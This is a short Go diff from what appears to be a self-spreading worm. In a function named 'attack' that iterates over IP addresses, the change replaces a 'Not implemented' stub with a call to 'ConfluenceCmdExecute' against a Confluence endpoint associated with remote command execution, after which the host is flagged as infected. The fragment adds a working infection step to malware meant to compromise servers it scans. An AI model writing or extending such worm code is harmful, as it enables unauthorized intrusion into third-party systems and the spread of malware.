@@ -49,7 +49,7 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 		}
 		//Confluence infect
 		if !infected && ports[2] != 0 {
-			fmt.Println("Not implemented")
+			infection.ConfluenceCmdExecute("http://" + ip_port , "/pages/createpage-entervariables.action?SpaceKey=x")
 			infected = true
 		}
 	}
